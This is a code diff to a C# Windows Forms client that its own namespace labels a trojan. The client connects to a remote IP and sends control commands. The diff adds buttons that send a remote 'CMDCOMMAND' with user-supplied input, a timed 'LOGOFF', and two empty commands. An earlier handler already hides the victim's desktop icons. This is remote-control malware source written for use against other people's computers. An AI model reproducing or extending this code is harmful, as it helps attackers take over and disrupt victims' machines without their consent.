@@ -30,6 +30,8 @@ namespace Trojan_Client__Schöner_
                 IsConnected = true;
                 Writer = Connector.GetStream();
                 label2.Text = "Connection succesful to: " + IP + ".";
+                textBox1.Enabled = false;
+                button1.Enabled = false;
                 button2.Enabled = true;
                 button3.Enabled = true;
                 button4.Enabled = true;
@@ -38,6 +40,8 @@ namespace Trojan_Client__Schöner_
                 button7.Enabled = true;
                 button8.Enabled = true;
                 button9.Enabled = true;
+                button12.Enabled = true;
+                button13.Enabled = true;
             }
             catch
             {
@@ -128,6 +132,38 @@ namespace Trojan_Client__Schöner_
 		private void Button9Click(object sender, EventArgs e)
 		{
 			SendCommand("SHOWDESKTOPICONS!!!!---");
+		}
+		private void Button10Click(object sender, EventArgs e)
+		{
+			SendCommand("!!!!---");
+		}
+		private void Button11Click(object sender, EventArgs e)
+		{
+			SendCommand("!!!!---");
+		}
+		private void Button13Click(object sender, EventArgs e)
+		{
+		string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
+           if (input != "")
+            {
+                SendCommand("CMDCOMMAND!!!!---" + input);
+            }
+            else
+            {
+                MessageBox.Show("Canceld", "Error");
+            }
+		}
+		private void Button12Click(object sender, EventArgs e) 
+		{
+		string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
+           if (input != "")
+            {
+                SendCommand("LOGOFF!!!!---" + input);
+            }
+            else
+            {
+                MessageBox.Show("Canceld", "Error");
+            }
 		}
     }
 
